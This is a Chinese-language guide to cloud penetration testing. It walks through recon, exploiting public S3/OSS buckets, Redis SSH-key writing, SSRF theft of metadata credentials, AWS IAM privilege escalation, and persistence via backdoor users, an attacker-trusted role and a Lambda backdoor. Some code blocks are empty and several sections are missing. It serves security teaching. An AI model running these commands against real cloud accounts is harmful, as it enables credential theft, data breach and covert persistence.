# 云渗透测试指南

> 本文档系统介绍云环境渗透测试的方法论和实战技术，涵盖信息收集、权限提升、数据泄露、横向移动、持久化等各个阶段，结合实际案例和工具使用指南。

---

## 一、云渗透测试方法论

### 1.1 云渗透测试与传统渗透测试的区别

| 对比项 | 传统渗透测试 | 云渗透测试 |
|--------|-------------|-----------|
| 测试对象 | 服务器、网络、应用 | 云服务配置、身份管理、API、容器 |
| 攻击面 | 固定资产 | 动态弹性、API 驱动、多租户 |
| 核心风险 | 漏洞利用、弱口令 | 配置错误、权限过大、密钥泄露 |
| 测试限制 | 较少限制 | 需遵守云厂商政策，提前报备 |
| 权限模型 | 系统用户/管理员 | IAM/RAM 用户/角色/策略 |
| 数据存储 | 本地存储 | 对象存储、云数据库 |
| 横向移动 | 内网渗透 | 跨服务、跨账户、跨区域 |

### 1.3 云渗透测试注意事项

#### 1.3.1 法律合规要求

**必须遵守的原则**：
1. **获得授权**：必须有书面授权文件，明确测试范围和时间
2. **遵守云厂商政策**：
   - AWS：AWS Customer Support Policy for Penetration Testing
   - 阿里云：云安全渗透测试须知
   - 禁止测试云基础设施（DDoS、端口扫描限制等）
3. **数据保护**：不得泄露、篡改或删除客户数据
4. **影响控制**：避免对业务系统造成影响

#### 1.3.2 常见禁止事项

| 禁止操作 | 说明 |
|----------|------|
| DDoS 攻击 | 禁止对云服务进行拒绝服务攻击 |
| 物理安全测试 | 禁止测试数据中心物理安全 |
| 其他租户测试 | 禁止测试其他客户的资源 |
| 云服务本身漏洞测试 | 禁止测试云厂商服务的 0day 漏洞 |
| 大规模端口扫描 | 可能触发云厂商安全防护 |
| 数据泄露测试 | 禁止实际下载或泄露客户数据 |

## 二、信息收集

### 2.1 子域名枚举

#### 2.1.1 子域名收集的意义

云环境中，子域名往往对应着不同的云服务：
- 对象存储（S3/OSS）
- CDN 节点
- 云服务器（EC2/ECS）
- 容器服务
- API 网关
- 无服务器函数

#### 2.1.2 常用子域名枚举工具

| 工具 | 说明 |
|------|------|
| Subfinder | 快速子域名发现工具 |
| Amass | OWASP 项目，功能强大 |
| Assetfinder | 轻量级子域名发现 |
| Sublist3r | 基于搜索引擎的子域名枚举 |
| OneForAll | 国产子域名收集工具 |

**Subfinder 使用示例**：
```bash
# 基本使用
subfinder -d example.com -o subdomains.txt

# 使用多个数据源
subfinder -d example.com -all -o subdomains.txt

# 结合 httpx 验证存活
subfinder -d example.com -silent | httpx -title -tech-detect -status-code
```

### 2.2 对象存储发现

#### 2.2.1 S3 存储桶发现方法

**方法一：基于公司名称猜测**
```bash
# 常见命名模式
company-name
companyname
company-name-assets
company-name-prod
company-name-backup
company-name-logs
companyname-static
```

**方法二：子域名 CNAME 检测**
```bash
# 检查子域名是否指向 S3
dig +short assets.example.com
# 如果输出包含 s3.amazonaws.com 或 s3-website 则是 S3 桶
```

**方法三：使用自动化工具**
- **S3Scanner**：扫描 S3 存储桶权限
- **bucket-stream**：实时发现 S3 桶
- **cloud_enum**：多云资源枚举工具

**S3Scanner 使用示例**：
```bash
# 安装
pip install s3scanner

# 扫描单个桶的权限
s3scanner bucket --bucket my-bucket

# 从文件中批量扫描
s3scanner scan --buckets-file bucket_names.txt

# 检查权限类型：公开读、公开写、公开读写、私有
```

#### 2.2.2 阿里云 OSS 存储桶发现

**命名规则**：
```
bucket-name.oss-cn-hangzhou.aliyuncs.com
```

**常见发现方法**：
1. 子域名 CNAME 检测
2. 证书透明度（CT）日志
3. 网页源代码中的 OSS 链接
4. APP 逆向中的 API 地址

**OSS 权限检测**：
```bash
# 检查是否为公共读
curl -I https://bucket-name.oss-cn-hangzhou.aliyuncs.com/
# 返回 200 OK 且有内容 = 公共读权限
# 返回 403 Forbidden = 私有
# 返回 404 Not Found = 桶不存在

# 检查是否可列举文件
curl https://bucket-name.oss-cn-hangzhou.aliyuncs.com/?max-keys=1000
# 返回 XML 格式的文件列表 = 公共读 + 列表权限
```

#### 2.2.3 存储桶命名规律

| 类型 | 命名模式 | 示例 |

#### 2.4.3 云凭证验证

**AWS 凭证验证**：
```bash

```

## 三、初始访问

### 3.1 凭证泄露利用

#### 3.1.1 AWS 凭证利用路径

获取到 AWS Access Key 后的利用步骤：

```
获取 Access Key
    │
    ▼
验证凭证有效性（sts get-caller-identity）
    │
    ├─ 是用户凭证 → 查看用户权限
    │    │
    │    ▼
    │  查看附加策略、内联策略、组策略
    │    │
    │    ▼
    │  评估权限范围，寻找可利用的服务
    │
    └─ 是角色凭证 → 查看角色信任策略和权限
         │
         ▼
      判断是否可进一步提权
```

**基本信息收集**：
```bash
# 获取当前身份信息
aws sts get-caller-identity

# 列出账户中的用户
aws iam list-users

# 列出账户中的角色
aws iam list-roles

# 列出 S3 存储桶
aws s3 ls

# 列出 EC2 实例
aws ec2 describe-instances

# 列出 Lambda 函数
aws lambda list-functions
```

### 3.2 配置错误利用

#### 3.2.1 S3 存储桶公开访问利用

**场景**：发现目标公司的 S3 存储桶允许公开访问。

**利用步骤**：
```bash
# 1. 列出存储桶中的文件
aws s3 ls s3://target-bucket --no-sign-request
# 或者
aws s3api list-objects --bucket target-bucket --no-sign-request

# 2. 查看感兴趣的文件
aws s3 cp s3://target-bucket/backup.sql ./backup.sql --no-sign-request

# 3. 检查是否有公开写权限
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
# 成功 = 有写权限，可投毒或篡改数据

# 4. 查找敏感文件
# 常见敏感文件：.env、*.sql、backup.*、credentials.*、id_rsa、*.pem
```

**常见敏感文件类型**：
| 文件类型 | 说明 |
|----------|------|
| `.env` | 环境变量配置，包含数据库密码、API Key |
| `*.sql` / `*.sql.gz` | 数据库备份 |
| `*.pem` / `*.key` | SSH 密钥、SSL 私钥 |
| `credentials` / `config` | AWS 凭证文件 |
| `access.log` / `*.log` | 访问日志，可能包含敏感信息 |
| `backup.*` | 备份文件 |
| `*.json` / `*.yaml` | 配置文件 |

#### 3.2.2 OSS 存储桶公开访问利用

```bash
# 1. 列出文件
curl "https://target-bucket.oss-cn-hangzhou.aliyuncs.com/?max-keys=1000"

# 2. 下载文件
curl -o backup.sql "https://target-bucket.oss-cn-hangzhou.aliyuncs.com/backup.sql"

# 3. 检查是否有写权限（使用 PUT 请求）
curl -X PUT -T test.txt "https://target-bucket.oss-cn-hangzhou.aliyuncs.com/test.txt"
# 返回 200 OK = 有写权限
```

#### 3.2.3 数据库公网暴露利用

**常见未授权访问的数据库**：

| 数据库 | 默认端口 | 未授权条件 |
|--------|----------|-----------|
| Redis | 6379 | 未设置密码 + 绑定 0.0.0.0 |
| MongoDB | 27017 | 未启用认证 + 公网暴露 |
| Elasticsearch | 9200 | 默认无认证 |
| Memcached | 11211 | 默认无认证 |
| MySQL | 3306 | 弱口令 + 公网暴露 |

**Redis 未授权访问利用**：
```bash

redis-cli -h target.com

# 2. 查看数据

GET key_name

# 3. 写入 SSH 公钥（如果知道服务器路径）
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAA...\n\n"

```

### 3.3 元数据服务攻击（SSRF 利用）

#### 3.3.1 元数据服务概述

云服务器上运行着元数据服务，实例可以通过特殊 IP 访问获取自身信息和凭证。

| 云平台 | 元数据服务地址 |
|--------|---------------|
| AWS | 169.254.169.254 |
| 阿里云 | 100.100.100.200 |
| Azure | 169.254.169.254 |
| Google Cloud | 169.254.169.254 |

#### 3.3.2 AWS IMDSv1 攻击路径

```
发现应用存在 SSRF 漏洞
    │
    ▼
访问元数据服务获取实例角色名
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
    │
    ▼
获取角色的临时凭证
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
    │
    ▼
获取 AccessKeyId、SecretAccessKey、SessionToken
    │
    ▼
使用临时凭证调用 AWS API
```

**关键元数据端点**：
```
# 基本信息
/latest/meta-data/instance-id
/latest/meta-data/public-ipv4
/latest/meta-data/ami-id

# 身份凭证（最重要）
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/{role-name}

# 用户数据（可能包含敏感配置）
/latest/user-data
```

#### 3.3.3 IMDSv2 的防护

IMDSv2 需要先通过 PUT 请求获取会话令牌，然后使用令牌访问元数据，增加了 SSRF 利用的难度。

```bash
# IMDSv2 需要两步
# 第一步：获取令牌
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 第二步：使用令牌访问
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/
```

**注意**：某些 SSRF 场景下，如果可以控制 HTTP 方法和请求头，IMDSv2 仍然可能被利用。

#### 3.3.4 阿里云元数据服务

```bash
# 获取实例信息
curl http://100.100.100.200/latest/meta-data/

# 获取 RAM 角色凭证
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/role-name
```

## 四、权限提升

### 4.1 AWS IAM 权限提升

#### 4.1.1 常见提权场景

| 场景 | 说明 | 利用条件 |
|------|------|----------|
| IAM 创建用户/密钥 | 创建新管理员用户或密钥 | 有 iam:CreateUser 等权限 |
| 策略修改 | 修改现有策略增加权限 | 有 iam:PutUserPolicy 等权限 |
| 角色扮演 | 扮演更高权限的角色 | 有 sts:AssumeRole 权限且信任策略允许 |
| 角色创建 | 创建高权限角色并扮演 | 有 iam:CreateRole + iam:CreatePolicy 等 |
| 组策略修改 | 通过组获得更多权限 | 有 iam:AddUserToGroup 等 |
| 权限边界绕过 | 修改或移除权限边界 | 有相应的 IAM 权限 |

#### 4.1.2 提权路径示例

**场景 1：拥有 iam:CreateAccessKey 权限**

```bash
# 前提：当前用户有 iam:CreateAccessKey 权限（但权限不足）

# 1. 查看所有用户
aws iam list-users

# 2. 找一个高权限用户（如管理员）
# 3. 为该用户创建新的 Access Key
aws iam create-access-key --user-name admin-user

# 4. 使用新创建的凭证
# 获得管理员权限
```

**场景 2：拥有 sts:AssumeRole 权限**

```bash
# 前提：当前身份可以扮演某个高权限角色

# 1. 列出可扮演的角色
aws iam list-roles

# 2. 查看角色信任策略，确认是否可以扮演
aws iam get-role --role-name admin-role

# 3. 扮演角色，获取临时凭证
aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/admin-role \
    --role-session-name attacker-session

# 4. 使用返回的临时凭证
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

**场景 3：拥有 iam:PutUserPolicy 权限**

```bash
# 前提：可以修改自己的内联策略

# 给自己添加管理员权限
aws iam put-user-policy \
    --user-name current-user \
    --policy-name full-access \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }'
```

#### 4.1.3 危险的权限组合

以下权限组合可能导致权限提升：

| 权限 | 可导致的提权 |
|------|-------------|
| `iam:CreateUser` + `iam:AddUserToGroup` | 创建用户加入高权限组 |
| `iam:CreateAccessKey` | 为高权限用户创建密钥 |
| `iam:PutUserPolicy` / `iam:PutRolePolicy` | 修改策略增加权限 |
| `iam:AttachUserPolicy` | 附加管理员策略 |
| `iam:PassRole` + 服务创建权限 | 通过服务角色获得权限 |
| `sts:AssumeRole` | 扮演高权限角色 |
| `lambda:CreateFunction` + `iam:PassRole` | 创建 Lambda 函数以角色权限执行 |
| `glue:CreateDevEndpoint` + `iam:PassRole` | Glue 开发终端提权 |

### 4.2 阿里云 RAM 权限提升

#### 4.2.1 类似的提权路径

阿里云 RAM 的提权原理与 AWS IAM 类似：

```bash
# 1. 查看当前身份
aliyun sts GetCallerIdentity

# 2. 查看当前用户权限
aliyun ram ListPoliciesForUser --UserName current-user

# 3. 列出所有角色
aliyun ram ListRoles

# 4. 扮演角色（如果有权限）
aliyun sts AssumeRole --RoleArn acs:ram::123456789012:role/admin-role \
    --RoleSessionName attacker
```

### 4.3 元数据服务提权

如果通过 SSRF 或其他方式访问了实例元数据服务，获取了实例角色的凭证，则相当于获得了该角色的所有权限。

**提权评估**：
1. 获取实例角色名称
2. 查看角色附加的策略
3. 评估角色权限范围
4. 如果角色权限很大（如管理员），则直接获得高权限

## 五、数据泄露

### 5.1 S3 存储桶数据泄露

#### 5.1.1 数据收集步骤

```
确认存储桶公开可读
    │
    ▼
列出存储桶中的所有对象
    │
    ▼
识别敏感文件类型
    │
    ├─ 配置文件（.env, config, *.json, *.yaml）
    ├─ 数据库备份（*.sql, *.dump, *.bak）
    ├─ 凭证文件（*.pem, *.key, credentials）
    ├─ 日志文件（*.log, access.log）
    ├─ 文档文件（*.docx, *.xlsx, *.pdf）
    └─ 源代码（*.zip, *.tar.gz）
    │
    ▼
下载并分析敏感文件
    │
    ▼
提取凭证、个人信息、商业数据等
```

#### 5.1.2 常见敏感数据类型

| 数据类型 | 说明 | 价值 |
|----------|------|------|
| AWS 凭证 | Access Key ID + Secret Access Key | 极高：可直接操作 AWS 资源 |
| 数据库密码 | 数据库连接凭证 | 高：可窃取/篡改数据 |
| 用户个人信息 | 姓名、手机号、身份证号等 | 高：隐私泄露 |
| 业务数据 | 订单、交易、财务数据 | 高：商业机密 |
| API 密钥 | 第三方服务密钥 | 中高：可滥用服务 |
| 源代码 | 应用源代码 | 中：可分析漏洞 |
| 内部文档 | 公司内部文档 | 中：商业情报 |

### 5.2 云数据库数据泄露

#### 5.2.1 数据库暴露利用路径

```
发现数据库公网暴露
    │
    ▼
尝试未授权访问（Redis/MongoDB/ES）
    │
    ├─ 成功 → 直接获取数据
    │
    └─ 失败（需要认证） → 尝试暴力破解
         │
         ├─ 弱口令 → 登录成功 → 获取数据
         │
         └─ 无法破解 → 尝试漏洞利用
```

#### 5.2.2 各类数据库利用

**MongoDB 未授权访问**：
```bash

# 列出数据库

# 查看数据

db.system.users.find()
```

**Elasticsearch 数据泄露**：
```bash
# 查看所有索引
curl http://target.com:9200/_cat/indices?v

# 查看索引数据
curl http://target.com:9200/index_name/_search?size=100

curl -X POST "http://target.com:9200/index_name/_search?scroll=1m" \
```

### 5.3 数据外传（Data Exfiltration）

获取数据后如何传出云环境：

| 方法 | 说明 | 检测难度 |
|------|------|----------|
| 直接下载 | 从存储桶直接下载到本地 | 中：可通过日志审计发现 |
| 复制到外部存储 | 复制到攻击者控制的存储桶 | 高：跨账户复制可能被检测 |
| 上传到文件服务 | 上传到第三方文件分享服务 | 中：出站流量异常 |
| DNS 隧道 | 通过 DNS 查询外传数据 | 高：隐蔽性强 |
| 数据库导出 | 导出数据库备份再下载 | 中：数据库操作日志 |

## 六、横向移动

### 6.1 云环境横向移动特点

传统内网横向移动 vs 云环境横向移动：

| 传统内网 | 云环境 |
|----------|--------|
| 同网段扫描 | 跨服务、跨区域、跨账户 |
| SMB/RDP/SSH 登录 | API 调用、角色扮演 |
| Pass-the-Hash | Access Key 复用 |
| 域控提权 | IAM/RAM 提权 |
| 内网代理 | VPC 对等连接、VPN |

### 6.2 横向移动路径

#### 6.2.1 跨服务移动

```
获取 S3 读取权限
    │
    ├─ S3 中有数据库备份 → 获取数据库凭证
    │    │
    │    ▼
    │  访问 RDS 数据库 → 获取更多数据
    │
    ├─ S3 中有源代码 → 分析漏洞
    │    │
    │    ▼
    │  利用应用漏洞 → 获取 EC2 权限
    │
    └─ S3 中有凭证 → 直接使用新凭证
         │
         ▼
      以新身份访问更多资源
```

#### 6.2.2 跨区域移动

```
在 us-east-1 区域获取凭证
    │
    ▼
尝试在其他区域使用相同凭证
    │
    ├─ eu-west-1 → 发现更多资源
    ├─ ap-southeast-1 → 发现更多资源
    └─ ...
```

**注意**：IAM 是全局服务，凭证在所有区域通用。但资源是区域级的，需要逐个区域枚举。

#### 6.2.3 跨账户移动

**通过角色信任**：
```
当前账户 A 中的身份
    │
    ▼
发现 A 账户中的角色信任 B 账户
    │
    ▼
（但通常是反过来：B 账户的角色信任 A 账户的身份）
    │
    ▼
如果账户 A 的身份可以扮演账户 B 的角色
→ 获得账户 B 的访问权限
```

**通过凭证复用**：
- 代码仓库中可能包含多个账户的凭证
- 不同环境（dev/staging/prod）可能使用不同账户
- 从一个账户的数据中找到另一个账户的凭证

### 6.3 VPC 内网渗透

如果获得了 VPC 内一台机器的权限，可以进行内网渗透：

```
获得 EC2 实例访问权限（SSM/SSH）
    │
    ▼
内网信息收集
    │
    ├─ 查看实例元数据 → 获取角色凭证
    ├─ 查看 VPC 网络配置 → 了解网络拓扑
    ├─ 扫描内网 → 发现其他实例
    ├─ 查看安全组 → 了解访问规则
    └─ 查看 DNS 记录 → 发现内部服务
    │
    ▼
横向移动到其他实例
    │
    ├─ 利用 SSH 密钥复用
    ├─ 利用弱口令
    ├─ 利用应用漏洞
    └─ 利用服务间信任
```

**内网信息收集命令**：
```bash
# 查看本机网络配置
ifconfig / ip addr

# 查看路由表
route -n / ip route

# 查看 DNS 配置
cat /etc/resolv.conf

# 扫描内网存活主机
nmap -sn 10.0.0.0/24

# 查看安全组（需要元数据或 API 权限）
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/security-groups
```

## 七、持久化

### 7.1 AWS 持久化技术

#### 7.1.1 IAM 持久化

**方法 1：创建新的 IAM 用户**
```bash
# 创建管理员用户
aws iam create-user --user-name backdoor-user

# 附加管理员策略
aws iam attach-user-policy \
    --user-name backdoor-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建访问密钥
aws iam create-access-key --user-name backdoor-user
```

**方法 2：为现有用户添加访问密钥**
```bash
# 为现有用户创建额外的密钥对
aws iam create-access-key --user-name existing-user
```

**方法 3：创建高权限角色**
```bash
# 创建信任攻击者账户的角色
aws iam create-role \
    --role-name backdoor-role \
    --assume-role-policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::attacker-account-id:root"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }'

# 附加管理员权限
aws iam attach-role-policy \
    --role-name backdoor-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

#### 7.1.2 Lambda 持久化

创建一个定期执行的 Lambda 函数，用于维持访问权限或创建后门。

```python
# Lambda 后门函数示例

def lambda_handler(event, context):

    try:
        iam.get_user(UserName='backdoor-user')
    except iam.exceptions.NoSuchEntityException:
        iam.create_user(UserName='backdoor-user')
        iam.attach_user_policy(
            UserName='backdoor-user',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        key = iam.create_access_key(UserName='backdoor-user')
        # 将密钥发送到攻击者控制的服务器
        # ...
    return 'Persistance maintained'
```

## 九、云渗透测试实战案例

### 案例一：Capital One 数据泄露事件复盘

**背景**：2019 年，Capital One 银行超过 1.06 亿客户数据泄露。

**攻击路径复盘**：

```
1. 信息收集
   - 发现 Capital One 使用 AWS
   - 发现其 Web 应用使用 WAF

2. 漏洞发现
   - 发现 WAF 配置存在 SSRF 漏洞
   - 可以通过 WAF 发起内部请求

3. 元数据服务攻击
   - 利用 SSRF 访问 169.254.169.254
   - 获取 EC2 实例角色名称
   - 获取角色的临时凭证

4. 权限评估
   - 角色拥有 S3 列表和读取权限
   - 角色权限范围超出最小权限原则

5. 数据窃取
   - 使用临时凭证列出 S3 存储桶
   - 发现存储客户数据的桶
   - 下载 1.06 亿客户记录

6. 数据外传
   - 将数据下载到攻击者本地
```

**失败的安全措施**：
- WAF 规则配置错误（存在 SSRF）
- EC2 角色权限过大（违反最小权限）
- 使用 IMDSv1（无需令牌）
- 缺乏异常 API 调用检测
- S3 访问日志未及时分析

### 案例二：从泄露的 Access Key 到域管理员（模拟）

**场景**：在 GitHub 上发现目标公司代码仓库中泄露了 AWS Access Key。

**攻击路径**：

```
1. 凭证验证
   - 验证 Access Key 有效
   - 确认是 IAM 用户而非根账号

2. 权限枚举
   - 查看用户附加的策略
   - 发现有 AmazonEC2FullAccess 权限
   - 发现有 S3 读取权限

3. 数据收集
   - 列出所有 S3 存储桶
   - 在一个备份桶中找到数据库备份
   - 下载备份，获取数据库密码

4. 进一步利用
   - 使用 EC2 权限创建新实例
   - 在目标 VPC 中创建堡垒机
   - 利用数据库密码连接 RDS

5. 权限提升
   - 发现数据库中有员工表，包含邮箱
   - 钓鱼攻击管理员
   - 或继续利用 AWS 权限提升

6. 持久化
   - 创建新的 IAM 用户作为后门
   - 创建信任外部账户的角色
```

### 案例三：Kubernetes 渗透测试路径

**场景**：发现目标公司的 Kubernetes API Server 暴露在公网上。

**攻击路径**：

```
1. 信息收集
   - 发现 k8s API Server（6443 端口）
   - 测试匿名访问

2. 匿名访问利用
   - 如果匿名访问被允许
   - 列出所有 Pod、Service、Secret
   - 获取敏感信息

3. 权限提升
   - 如果有 create pods 权限
   - 创建特权容器挂载宿主机磁盘
   - 读取宿主机文件，获取 kubelet 凭证

4. 容器逃逸
   - 特权容器 + 挂载 /
   - 写入 SSH 公钥到宿主机
   - 直接控制节点

5. 集群控制
   - 获取节点上的 ServiceAccount Token
   - 使用 Token 访问 API Server
   - 可能获得集群管理员权限

6. 数据窃取
   - 读取所有 Secret
   - 获取应用数据库密码
   - 获取云服务凭证
   - 窃取业务数据
```

### 10.4 Pacu 使用简介

Pacu 是一个模块化的 AWS 渗透测试框架，类似 Metasploit。

```bash
# 安装
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip install -r requirements.txt

# 运行
python3 pacu.py

# 常用命令
# 设置凭证
set_keys

# 信息收集模块
run iam__enum_users
run iam__enum_roles
run s3__enum
run ec2__enum

# 权限提升模块
run iam__privesc_scan

# 持久化模块
run iam__create_backdoor_user
```

---

> **小结**：云渗透测试的核心是利用配置错误和权限管理缺陷，从信息收集到凭证获取，再到权限提升和数据窃取，形成完整的攻击链。防御方需要建立持续的安全审计和监控机制，及时发现和修复配置错误，遵循最小权限原则，防止云环境被入侵。
